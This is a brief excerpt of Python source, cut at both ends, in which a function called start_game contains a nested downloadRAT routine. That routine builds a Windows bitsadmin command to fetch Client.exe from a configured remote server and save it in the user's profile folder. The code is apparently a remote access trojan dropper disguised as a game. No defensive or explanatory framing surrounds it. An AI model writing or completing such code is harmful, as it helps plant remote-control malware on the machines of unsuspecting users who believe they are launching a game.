...
def start_game():
    ...
    destination = os.environ["USERPROFILE"] + "\\Client.exe"

    def downloadRAT(): 
        cmd = "bitsadmin /transfer rdl /download /priority high http://{}:{}/Client.exe {}".format(config.SERVER, config.PORT, destination)
